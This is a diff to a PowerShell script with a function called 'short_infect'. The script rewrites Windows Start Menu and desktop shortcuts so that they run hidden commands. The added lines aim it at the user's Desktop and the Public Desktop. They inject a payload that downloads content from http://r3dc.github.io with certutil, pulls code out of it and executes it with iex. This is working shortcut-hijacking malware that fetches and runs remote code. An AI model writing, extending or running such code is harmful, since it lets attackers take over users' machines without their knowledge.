@@ -29,7 +29,7 @@ ForEach($ShortCut in $StartMenu);
         $short.Arguments = $Argument;
         $short.WorkingDirectory = $lnk.WorkingDirectory;
         $short.WindowStyle =7;
-        if($lnk.IconLocation -eq ",0");
+        if($lnk.IconLocation -eq ",0")
         {
             $short.IconLocation = $lnk.TargetPath+" ,0";
             Write-Host "(1)Icon:>"$short.IconLocation;
@@ -37,13 +37,13 @@ ForEach($ShortCut in $StartMenu);
         {
             $short.IconLocation = $lnk.IconLocation;
             Write-Host "(2)Icon:>"$short.IconLocation;
-        };
+        }
         $short.Save();
         write-host "final commande shortcut: >>>>"$SourceFilePath $Argument;
-    };
-};
-};
-short_infect -PathShortcut "C:\AdwCleaner" '$t=certutil -urlcache -f http://r3dc.github.io;$c='''';For($i=3;$i -lt $t.Count-1;$i++){$c += -join $t[$i][61..76]};iex $c';
-$desktop_path=env:USERPROFILE +  \Desktop;
-#short_infect -PathShortcut $desktop_path '$t=certutil -urlcache -f http://r3dc.github.io;$c='''';For($i=3;$i -lt $t.Count-1;$i++){$c += -join $t[$i][61..76]};iex $c';
-#short_infect -PathShortcut "C:\Users\Public\Desktop" '$t=certutil -urlcache -f http://r3dc.github.io;$c='''';For($i=3;$i -lt $t.Count-1;$i++){$c += -join $t[$i][61..76]};iex $c';
+    }
+}
+}
+$desktop_path= $env:USERPROFILE;
+$desktop_path+= "\Desktop";
+short_infect -PathShortcut $desktop_path '$t=certutil -urlcache -f http://r3dc.github.io;$c='''';For($i=3;$i -lt $t.Count-1;$i++){$c += -join $t[$i][61..76]};iex $c';
+short_infect -PathShortcut "C:\Users\Public\Desktop" '$t=certutil -urlcache -f http://r3dc.github.io;$c='''';For($i=3;$i -lt $t.Count-1;$i++){$c += -join $t[$i][61..76]};iex $c';
